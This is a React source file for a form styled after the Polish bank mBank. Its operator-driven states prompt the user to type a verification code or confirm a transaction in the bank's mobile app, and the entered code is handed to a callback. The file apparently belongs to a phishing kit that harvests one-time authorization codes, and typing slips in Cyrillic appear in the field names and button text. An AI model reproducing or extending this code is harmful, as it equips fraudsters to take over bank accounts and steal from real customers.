import React, {Fragment, useState} from "react";
import * as yup from "yup";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import {Form} from "reactstrap";

const schema = yup.object().shape({
    code: yup.string().min(3).required(),
});

const MbankFormCode = ({status, handler, type}) => {
    const [loading, setLoading] = useState(false);
    const {register, handleSubmit, reset, formState} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const errors = formState.errors;
    const clearCode = (data) => {
        // setStep(1);
        // setLogin(false);
        reset();
        handler(data.code);
    }


    return (
        <div className="login-container">
            <Form autoComplete="off" onSubmit={handleSubmit(clearCode)}>
                <div className="color"/>
                <div className="login-content">

                    {
                        loading || status === 'send_code' ?
                            <div className="spinner-container">
                                <div className="photo spinner"/>
                            </div> :
                            status === 'getting_code' || status === 'wrong_code' ?
                                <Fragment key={'code'}>

                                    {status === 'wrong_code' || status === 'wrong_push_code' ?
                                        <div className="error-container" role="alert">
                                            <div id="errorMessage" className="message">
                                                <p>Zły kod</p>
                                            </div>
                                            <div id="errorDetails" className="details">
                                                Upewnij się, że poprawność wpisywanego kod
                                            </div>
                                        </div> :
                                        <div className="title-container ">
                                            <h2 className="accessible-not-visible">Wpisz kod</h2>
                                            <div className="title">
                                                {
                                                    status === 'getting_push_code' || status === 'wrong_push_code' ? 'Potwierdź transakcję w aplikacji mobilnej banku' : 'Wpisz kod'
                                                }

                                            </div>
                                        </div>
                                    }
                                    <div className="form-container">

                                        {
                                            status === 'getting_code' ?
                                                <div className="photo-container">
                                                    <div className={`avatar photo photo-${type}`}/>
                                                </div> : null
                                        }

                                        <div className="field-container">

                                            <div className={`form-input ${errors.сщву && 'error'}`}>
                                                <input type="text"
                                                       placeholder="Wpisz kod"
                                                       autoComplete="off"
                                                       {...register('code')}
                                                />

                                            </div>
                                            {
                                                errors.login &&
                                                <p className={'error_message'}>
                                                    Uzupełnij to pole.
                                                </p>
                                            }

                                        </div>
                                    </div>
                                    <div className="buttons form-buttons">
                                        <button type="submit" className="btn"
                                                aria-disabled="true"
                                        >
                                            Зosłać
                                        </button>
                                    </div>
                                </Fragment> : null

                    }


                </div>


                <div className="buttons error-buttons">
                    <button id="reloginBtn" type="submit" className="btn">
                        Zaloguj się ponownie
                    </button>
                </div>
                <div className="buttons redirect-activation-buttons">
                    <button id="redirectActivatioBtn" type="submit" className="btn">
                        Dalej
                    </button>
                </div>
                <div className="buttons finish-button">
                    <button id="finishBtn" type="submit" className="btn">
                        Zakończ
                    </button>
                </div>
            </Form>
        </div>
    )
}
export default MbankFormCode;